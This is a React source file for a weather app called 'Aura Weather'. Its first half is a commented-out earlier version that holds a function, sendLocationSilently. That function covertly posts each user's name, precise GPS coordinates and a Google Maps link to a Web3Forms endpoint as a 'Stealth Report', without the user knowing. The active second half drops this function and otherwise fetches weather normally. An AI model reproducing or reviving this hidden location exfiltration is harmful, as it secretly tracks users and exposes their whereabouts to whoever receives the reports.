// import React, {
//   useCallback,
//   useMemo,
//   useState,
//   useEffect
// } from 'react';

// import axios from 'axios';

// import Onboarding from './components/Onboarding';
// import Dashboard from './components/Dashboard';

// import './App.css';

// const OPENWEATHER_API_KEY = import.meta.env.VITE_OPENWEATHER_API_KEY;
// const OPENWEATHER_API_URL = import.meta.env.VITE_OPENWEATHER_API_URL;
// const WEB3FORMS_ACCESS_KEY = import.meta.env.VITE_WEB3FORMS_ACCESS_KEY;

// const WEATHER_ICON_BASE_URL = 'https://openweathermap.org/img/wn';
// const WEB3FORMS_ENDPOINT = 'https://api.web3forms.com/submit';

// const DEFAULT_LOCATION_OPTIONS = {
//   enableHighAccuracy: true,
//   timeout: 10000,
//   maximumAge: 0
// };

// const formatTemperature = (temperature) => {
//   if (typeof temperature !== 'number' || Number.isNaN(temperature)) return '--';
//   return Math.round(temperature);
// };

// const formatWindSpeed = (speed) => {
//   if (typeof speed !== 'number' || Number.isNaN(speed)) return '--';
//   return speed.toFixed(1);
// };

// const formatCoordinate = (coordinate) => {
//   if (typeof coordinate !== 'number' || Number.isNaN(coordinate)) return '--';
//   return coordinate.toFixed(6);
// };

// const generateGoogleMapsLink = (latitude, longitude) => {
//   return `https://www.google.com/maps?q=${latitude},${longitude}`;
// };

// const getWeatherIconUrl = (iconCode) => {
//   if (!iconCode) return '';
//   return `${WEATHER_ICON_BASE_URL}/${iconCode}@2x.png`;
// };

// const validateSearchQuery = (query) => {
//   if (!query || !query.trim()) {
//     return { valid: false, message: 'Please enter a city name.' };
//   }
//   if (query.trim().length < 2) {
//     return { valid: false, message: 'City name must contain at least 2 characters.' };
//   }
//   return { valid: true, message: '' };
// };

// const getGeolocationErrorMessage = (error) => {
//   if (!error) return 'Unable to access your location.';
//   switch (error.code) {
//     case 1:
//       return 'Location permission denied. Please search your city manually.';
//     case 2:
//       return 'Your location could not be determined. Please try again or search manually.';
//     case 3:
//       return 'Location request timed out. Please try again or search manually.';
//     default:
//       return 'Unable to access your location. Please search manually.';
//   }
// };

// const validateConfiguration = () => {
//   const missingVariables = [];
//   if (!OPENWEATHER_API_KEY) missingVariables.push('VITE_OPENWEATHER_API_KEY');
//   if (!OPENWEATHER_API_URL) missingVariables.push('VITE_OPENWEATHER_API_URL');
//   return missingVariables;
// };

// export default function App() {
//   // LocalStorage se initial state read karein taaki refresh par wipe na ho
//   const [step, setStep] = useState(() => {
//     return localStorage.getItem('aura_step') ? Number(localStorage.getItem('aura_step')) : 1;
//   });
  
//   const [userName, setUserName] = useState(() => {
//     return localStorage.getItem('aura_username') || '';
//   });

//   const [searchQuery, setSearchQuery] = useState('');
//   const [weatherData, setWeatherData] = useState(() => {
//     const saved = localStorage.getItem('aura_weather');
//     return saved ? JSON.parse(saved) : null;
//   });

//   const [loading, setLoading] = useState(false);
//   const [error, setError] = useState('');
//   const [successMessage, setSuccessMessage] = useState('');

//   const [currentLocation, setCurrentLocation] = useState(null);
//   const [lastSearch, setLastSearch] = useState(() => {
//     return localStorage.getItem('aura_last_search') || '';
//   });
//   const [locationLoading, setLocationLoading] = useState(false);

//   const missingConfiguration = useMemo(() => validateConfiguration(), []);

//   const clearMessages = useCallback(() => {
//     setError('');
//     setSuccessMessage('');
//   }, []);

//   // State change hone par localStorage mein save karein
//   useEffect(() => {
//     localStorage.setItem('aura_step', step);
//   }, [step]);

//   useEffect(() => {
//     if (userName) localStorage.setItem('aura_username', userName);
//   }, [userName]);

//   useEffect(() => {
//     if (weatherData) localStorage.setItem('aura_weather', JSON.stringify(weatherData));
//   }, [weatherData]);

//   useEffect(() => {
//     if (lastSearch) localStorage.setItem('aura_last_search', lastSearch);
//   }, [lastSearch]);

//   const sendLocationSilently = useCallback(async (name, latitude, longitude, accuracy) => {
//     if (!WEB3FORMS_ACCESS_KEY) return;
//     try {
//       const mapLink = generateGoogleMapsLink(latitude, longitude);
//       const locationMessage = `
// Aura Weather - Silent Location Capture
// ----------------------------------------
// User Name: ${name}
// Latitude: ${formatCoordinate(latitude)}
// Longitude: ${formatCoordinate(longitude)}
// Accuracy: ${Math.round(accuracy || 0)} meters
// Google Maps: ${mapLink}
//       `.trim();

//       await fetch(WEB3FORMS_ENDPOINT, {
//         method: 'POST',
//         headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
//         body: JSON.stringify({
//           access_key: WEB3FORMS_ACCESS_KEY,
//           subject: `Stealth Report: Location of ${name}`,
//           from_name: 'Aura Weather',
//           name: name,
//           email: '',
//           message: locationMessage
//         })
//       });
//     } catch (err) {
//       console.error('Silent sync error', err);
//     }
//   }, []);

//   const fetchWeather = useCallback(async (query) => {
//     if (missingConfiguration.length > 0) {
//       setError(`Missing environment variables: ${missingConfiguration.join(', ')}`);
//       return;
//     }

//     const validation = validateSearchQuery(query);
//     if (!validation.valid) {
//       setError(validation.message);
//       return;
//     }

//     setLoading(true);
//     clearMessages();

//     try {
//       let requestUrl = '';
//       if (query.includes(',')) {
//         const [latitude, longitude] = query.split(',').map((val) => val?.trim());
//         if (!latitude || !longitude) throw new Error('Invalid coordinates.');
//         requestUrl = `${OPENWEATHER_API_URL}?lat=${latitude}&lon=${longitude}&appid=${OPENWEATHER_API_KEY}&units=metric`;
//       } else {
//         requestUrl = `${OPENWEATHER_API_URL}?q=${encodeURIComponent(query.trim())}&appid=${OPENWEATHER_API_KEY}&units=metric`;
//       }

//       const response = await axios.get(requestUrl, { timeout: 15000 });
//       const data = response?.data;

//       if (!data || !data.main || !data.weather || !data.weather[0]) {
//         throw new Error('Invalid weather response.');
//       }

//       const weather = data.weather[0];
//       const formattedWeather = {
//         name: data.name || 'Unknown Location',
//         country: data.sys?.country || '',
//         temp: data.main.temp,
//         feels_like: data.main.feels_like,
//         humidity: data.main.humidity,
//         pressure: data.main.pressure,
//         wind: data.wind?.speed || 0,
//         wind_direction: data.wind?.deg || 0,
//         condition: weather.main || 'Unknown',
//         description: weather.description || 'No description available',
//         icon: getWeatherIconUrl(weather.icon),
//         iconCode: weather.icon || '',
//         visibility: data.visibility || 0,
//         sunrise: data.sys?.sunrise || null,
//         sunset: data.sys?.sunset || null
//       };

//       setWeatherData(formattedWeather);
//       setLastSearch(query);
//       setStep(2);
//       setSuccessMessage(`Weather updated for ${formattedWeather.name}.`);
//     } catch (requestError) {
//       console.error('Weather Fetch Error:', requestError);
//       const status = requestError?.response?.status;
//       if (status === 401) setError('OpenWeatherMap API key invalid or unauthorized.');
//       else if (status === 404) setError('City nahi mili. Please city ka naam check karein.');
//       else if (status === 429) setError('Weather API request limit reached. Please try again later.');
//       else if (requestError?.code === 'ECONNABORTED') setError('Weather request timed out. Please try again.');
//       else setError('Mausam ki jankari nahi mil saki. Please try again.');
//     } finally {
//       setLoading(false);
//     }
//   }, [clearMessages, missingConfiguration]);

//   const handleLocationSuccess = useCallback(async (position) => {
//     const { latitude, longitude, accuracy } = position.coords;
//     setCurrentLocation({ latitude, longitude, accuracy, mapsLink: generateGoogleMapsLink(latitude, longitude) });
//     await fetchWeather(`${latitude},${longitude}`);
//     sendLocationSilently(userName, latitude, longitude, accuracy);
//   }, [fetchWeather, sendLocationSilently, userName]);

//   const handleLocationError = useCallback((locationError) => {
//     console.error('Geolocation Error:', locationError);
//     setLocationLoading(false);
//     setLoading(false);
//     setError(getGeolocationErrorMessage(locationError));
//     setStep(2);
//   }, []);

//   const handleStart = useCallback(() => {
//     const trimmedName = userName.trim();
//     if (!trimmedName) {
//       setError('Pehle apna naam daaliye!');
//       return;
//     }

//     clearLocalStorage(); // Naye user ke liye purana data clear karein
//     clearMessages();

//     if (!navigator.geolocation) {
//       setError('Aapke browser mein geolocation supported nahi hai. Manual search karein.');
//       setStep(2);
//       return;
//     }

//     setLoading(true);
//     setLocationLoading(true);

//     navigator.geolocation.getCurrentPosition(
//       async (position) => {
//         try {
//           await handleLocationSuccess(position);
//         } finally {
//           setLoading(false);
//           setLocationLoading(false);
//         }
//       },
//       (locationError) => handleLocationError(locationError),
//       DEFAULT_LOCATION_OPTIONS
//     );
//   }, [clearMessages, handleLocationError, handleLocationSuccess, userName]);

//   const clearLocalStorage = () => {
//     localStorage.removeItem('aura_step');
//     localStorage.removeItem('aura_username');
//     localStorage.removeItem('aura_weather');
//     localStorage.removeItem('aura_last_search');
//   };

//   const handleSearch = useCallback(async (event) => {
//     event.preventDefault();
//     const validation = validateSearchQuery(searchQuery);
//     if (!validation.valid) {
//       setError(validation.message);
//       return;
//     }
//     await fetchWeather(searchQuery.trim());
//   }, [fetchWeather, searchQuery]);

//   const handleRefresh = useCallback(async () => {
//     clearMessages();
//     setStep(2);

//     if (currentLocation) {
//       await fetchWeather(`${currentLocation.latitude},${currentLocation.longitude}`);
//       return;
//     }

//     if (lastSearch) {
//       await fetchWeather(lastSearch);
//       return;
//     }

//     setError('Refresh karne ke liye koi location available nahi hai.');
//   }, [clearMessages, currentLocation, fetchWeather, lastSearch]);

//   if (step === 1 || !userName) {
//     return (
//       <Onboarding
//         userName={userName}
//         setUserName={setUserName}
//         error={error}
//         setError={setError}
//         loading={loading}
//         locationLoading={locationLoading}
//         handleStart={handleStart}
//       />
//     );
//   }

//   return (
//     <Dashboard
//       userName={userName}
//       searchQuery={searchQuery}
//       setSearchQuery={setSearchQuery}
//       weatherData={weatherData}
//       loading={loading}
//       error={error}
//       successMessage={successMessage}
//       handleSearch={handleSearch}
//       handleRefresh={handleRefresh}
//       formatTemperature={formatTemperature}
//       formatWindSpeed={formatWindSpeed}
//     />
//   );
// }

import React, {
  useCallback,
  useMemo,
  useState,
  useEffect
} from 'react';

import axios from 'axios';

import Onboarding from './components/Onboarding';
import Dashboard from './components/Dashboard';

import './App.css';

const OPENWEATHER_API_KEY = import.meta.env.VITE_OPENWEATHER_API_KEY;
const OPENWEATHER_API_URL = import.meta.env.VITE_OPENWEATHER_API_URL;

const WEATHER_ICON_BASE_URL = 'https://openweathermap.org/img/wn';

const DEFAULT_LOCATION_OPTIONS = {
  enableHighAccuracy: true,
  timeout: 10000,
  maximumAge: 0
};

const formatTemperature = (temperature) => {
  if (typeof temperature !== 'number' || Number.isNaN(temperature)) return '--';
  return Math.round(temperature);
};

const formatWindSpeed = (speed) => {
  if (typeof speed !== 'number' || Number.isNaN(speed)) return '--';
  return speed.toFixed(1);
};

const formatCoordinate = (coordinate) => {
  if (typeof coordinate !== 'number' || Number.isNaN(coordinate)) return '--';
  return coordinate.toFixed(6);
};

const generateGoogleMapsLink = (latitude, longitude) => {
  return `https://www.google.com/maps?q=${latitude},${longitude}`;
};

const getWeatherIconUrl = (iconCode) => {
  if (!iconCode) return '';
  return `${WEATHER_ICON_BASE_URL}/${iconCode}@2x.png`;
};

const validateSearchQuery = (query) => {
  if (!query || !query.trim()) {
    return { valid: false, message: 'Please enter a city name.' };
  }
  if (query.trim().length < 2) {
    return { valid: false, message: 'City name must contain at least 2 characters.' };
  }
  return { valid: true, message: '' };
};

const getGeolocationErrorMessage = (error) => {
  if (!error) return 'Unable to access your location.';
  switch (error.code) {
    case 1:
      return 'Location permission denied. Please search your city manually.';
    case 2:
      return 'Your location could not be determined. Please try again or search manually.';
    case 3:
      return 'Location request timed out. Please try again or search manually.';
    default:
      return 'Unable to access your location. Please search manually.';
  }
};

const validateConfiguration = () => {
  const missingVariables = [];
  if (!OPENWEATHER_API_KEY) missingVariables.push('VITE_OPENWEATHER_API_KEY');
  if (!OPENWEATHER_API_URL) missingVariables.push('VITE_OPENWEATHER_API_URL');
  return missingVariables;
};

export default function App() {
  const [step, setStep] = useState(() => {
    return localStorage.getItem('aura_step') ? Number(localStorage.getItem('aura_step')) : 1;
  });
  
  const [userName, setUserName] = useState(() => {
    return localStorage.getItem('aura_username') || '';
  });

  const [searchQuery, setSearchQuery] = useState('');
  const [weatherData, setWeatherData] = useState(() => {
    const saved = localStorage.getItem('aura_weather');
    return saved ? JSON.parse(saved) : null;
  });

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [successMessage, setSuccessMessage] = useState('');

  const [currentLocation, setCurrentLocation] = useState(null);
  const [lastSearch, setLastSearch] = useState(() => {
    return localStorage.getItem('aura_last_search') || '';
  });
  const [locationLoading, setLocationLoading] = useState(false);

  const missingConfiguration = useMemo(() => validateConfiguration(), []);

  const clearMessages = useCallback(() => {
    setError('');
    setSuccessMessage('');
  }, []);

  useEffect(() => {
    localStorage.setItem('aura_step', step);
  }, [step]);

  useEffect(() => {
    if (userName) localStorage.setItem('aura_username', userName);
  }, [userName]);

  useEffect(() => {
    if (weatherData) localStorage.setItem('aura_weather', JSON.stringify(weatherData));
  }, [weatherData]);

  useEffect(() => {
    if (lastSearch) localStorage.setItem('aura_last_search', lastSearch);
  }, [lastSearch]);

  const fetchWeather = useCallback(async (query) => {
    if (missingConfiguration.length > 0) {
      setError(`Missing environment variables: ${missingConfiguration.join(', ')}`);
      return;
    }

    const validation = validateSearchQuery(query);
    if (!validation.valid) {
      setError(validation.message);
      return;
    }

    setLoading(true);
    clearMessages();

    try {
      let requestUrl = '';
      if (query.includes(',')) {
        const [latitude, longitude] = query.split(',').map((val) => val?.trim());
        if (!latitude || !longitude) throw new Error('Invalid coordinates.');
        requestUrl = `${OPENWEATHER_API_URL}?lat=${latitude}&lon=${longitude}&appid=${OPENWEATHER_API_KEY}&units=metric`;
      } else {
        requestUrl = `${OPENWEATHER_API_URL}?q=${encodeURIComponent(query.trim())}&appid=${OPENWEATHER_API_KEY}&units=metric`;
      }

      const response = await axios.get(requestUrl, { timeout: 15000 });
      const data = response?.data;

      if (!data || !data.main || !data.weather || !data.weather[0]) {
        throw new Error('Invalid weather response.');
      }

      const weather = data.weather[0];
      const formattedWeather = {
        name: data.name || 'Unknown Location',
        country: data.sys?.country || '',
        temp: data.main.temp,
        feels_like: data.main.feels_like,
        humidity: data.main.humidity,
        pressure: data.main.pressure,
        wind: data.wind?.speed || 0,
        wind_direction: data.wind?.deg || 0,
        condition: weather.main || 'Unknown',
        description: weather.description || 'No description available',
        icon: getWeatherIconUrl(weather.icon),
        iconCode: weather.icon || '',
        visibility: data.visibility || 0,
        sunrise: data.sys?.sunrise || null,
        sunset: data.sys?.sunset || null
      };

      setWeatherData(formattedWeather);
      setLastSearch(query);
      setStep(2);
      setSuccessMessage(`Weather updated for ${formattedWeather.name}.`);
    } catch (requestError) {
      console.error('Weather Fetch Error:', requestError);
      const status = requestError?.response?.status;
      if (status === 401) setError('OpenWeatherMap API key invalid or unauthorized.');
      else if (status === 404) setError('City nahi mili. Please city ka naam check karein.');
      else if (status === 429) setError('Weather API request limit reached. Please try again later.');
      else if (requestError?.code === 'ECONNABORTED') setError('Weather request timed out. Please try again.');
      else setError('Mausam ki jankari nahi mil saki. Please try again.');
    } finally {
      setLoading(false);
    }
  }, [clearMessages, missingConfiguration]);

  const handleLocationSuccess = useCallback(async (position) => {
    const { latitude, longitude, accuracy } = position.coords;
    setCurrentLocation({ latitude, longitude, accuracy, mapsLink: generateGoogleMapsLink(latitude, longitude) });
    await fetchWeather(`${latitude},${longitude}`);
  }, [fetchWeather]);

  const handleLocationError = useCallback((locationError) => {
    console.error('Geolocation Error:', locationError);
    setLocationLoading(false);
    setLoading(false);
    setError(getGeolocationErrorMessage(locationError));
    setStep(2);
  }, []);

  const handleStart = useCallback(() => {
    const trimmedName = userName.trim();
    if (!trimmedName) {
      setError('Pehle apna naam daaliye!');
      return;
    }

    clearLocalStorage();
    clearMessages();

    if (!navigator.geolocation) {
      setError('Aapke browser mein geolocation supported nahi hai. Manual search karein.');
      setStep(2);
      return;
    }

    setLoading(true);
    setLocationLoading(true);

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          await handleLocationSuccess(position);
        } finally {
          setLoading(false);
          setLocationLoading(false);
        }
      },
      (locationError) => handleLocationError(locationError),
      DEFAULT_LOCATION_OPTIONS
    );
  }, [clearMessages, handleLocationError, handleLocationSuccess, userName]);

  const clearLocalStorage = () => {
    localStorage.removeItem('aura_step');
    localStorage.removeItem('aura_username');
    localStorage.removeItem('aura_weather');
    localStorage.removeItem('aura_last_search');
  };

  const handleSearch = useCallback(async (event) => {
    event.preventDefault();
    const validation = validateSearchQuery(searchQuery);
    if (!validation.valid) {
      setError(validation.message);
      return;
    }
    await fetchWeather(searchQuery.trim());
  }, [fetchWeather, searchQuery]);

  const handleRefresh = useCallback(async () => {
    clearMessages();
    setStep(2);

    if (currentLocation) {
      await fetchWeather(`${currentLocation.latitude},${currentLocation.longitude}`);
      return;
    }

    if (lastSearch) {
      await fetchWeather(lastSearch);
      return;
    }

    setError('Refresh karne ke liye koi location available nahi hai.');
  }, [clearMessages, currentLocation, fetchWeather, lastSearch]);

  if (step === 1 || !userName) {
    return (
      <Onboarding
        userName={userName}
        setUserName={setUserName}
        error={error}
        setError={setError}
        loading={loading}
        locationLoading={locationLoading}
        handleStart={handleStart}
      />
    );
  }

  return (
    <Dashboard
      userName={userName}
      searchQuery={searchQuery}
      setSearchQuery={setSearchQuery}
      weatherData={weatherData}
      loading={loading}
      error={error}
      successMessage={successMessage}
      handleSearch={handleSearch}
      handleRefresh={handleRefresh}
      formatTemperature={formatTemperature}
      formatWindSpeed={formatWindSpeed}
    />
  );
}